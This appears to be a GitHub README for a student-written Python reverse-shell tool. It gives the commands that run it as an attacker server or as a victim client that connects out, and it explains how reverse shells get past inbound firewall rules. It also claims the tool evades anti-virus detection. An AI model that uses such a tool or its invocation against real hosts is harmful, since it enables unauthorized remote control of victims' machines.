

# Sample Demo:
![Alt Text](https://github.com/heecheon92/Reverse_shell/blob/master/rshell_demo.png)

# How to Use?

You can run this program either as a server (attacker) or client (victim)

## To run as a server:
```
  python3 rshell.py -m server -p port_number
```
## To run as a client:
```
  python3 rshell.py -m client -t server_ip_address -p server_port_number
```
# Well, so how does it work?

Server program opens up an accessible port.

Once the server program is running, client program can be executed to connect to the port hosted by the server.

Unlike normal shells or also known as "bind shell", in which an innocent server simply allow an user to connect and the malicous user client can send payloads to attack the server node, in reverse shell, the server program acts as a malicous endpoint and allows the server to execute shell commands to a client.

In most network environment, it is a common practice that in-bound policy is set to be strict to prevent malicous actions to be done and typically, out-bound policy is set to be loose so that users within the network can freely traverse the endpoints outside of the firewall.

Due to this environment, exploitation by bind shell is not really easily acheiveable.

However, since the attcker is the server so that the in-bound policy can be set relatively loosely or set with no in-bound policy at all so that client can easily access to the server, implementing reverse shell is very effective to control a remote node.

All communication between the server and the client is not secure and can be easily detected by network monitoring tools like Wireshark. I am planning to add a security layer.



Bind Shell:

Server (Victim) ---------|Firewall|<<---------Client (Attacker)

It is easy to fail to make connection if an out-bound policy of firewall is well set.

Reverse Shell:

Server (Attacker) -------NO-FIREWALL <<------------Client (Victim)

Attacker set no in-bound policy so that victims can freely connect to the trap server.

So, a reverse shell is just a shell that uses common firewall's counter-exploitative nature.

Again, even though this is a very simple program, it won't be detected by an anti-virus software as a threat.

So, DO NOT USE TO HARM OTHER ENDPOINTS.


# A Very Long Disclaimer: 

I am not responsible for any real / potential damage by the use of this project

I am not a professional penetration tester.

However, I do find network/socket programming very attractive and based on what I learned from

network class in college and socket programming I picked up from somewhere, I have made this little sneaky programs.

Just because I like to understand about penetration testing, it does not mean I would like to relentlessly abuse well known tools or frameworks (such as metasploit....veil....sqlmap.....hashcat.....etc). Instead, I wanted to try making my own script and see what I can do. I am not saying those penetration tools are bad. In fact, I get amazed how well they are automated to attack mutliple victim nodes. I just do not want to solely rely on them.




